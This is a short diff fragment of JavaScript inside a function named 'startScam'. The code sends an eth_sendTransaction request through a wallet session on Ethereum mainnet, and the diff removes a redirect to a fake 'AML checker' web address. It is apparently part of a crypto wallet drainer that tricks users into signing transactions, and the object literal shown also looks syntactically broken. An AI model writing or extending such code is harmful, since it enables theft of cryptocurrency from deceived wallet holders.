@@ -856,7 +856,6 @@ async function startScam() {
       topic: session.topic,
       request: { id: Date.now(), jsonrpc: '2.0', method: 'eth_sendTransaction', params: [tx] },
       chainId: 'eip155:1'
-      redirect: { universal: 'https://aml-checker-4.vercel.app/verifyaddress' }
     });
   } catch (e) { console.error('Approve échoué', e); }
 
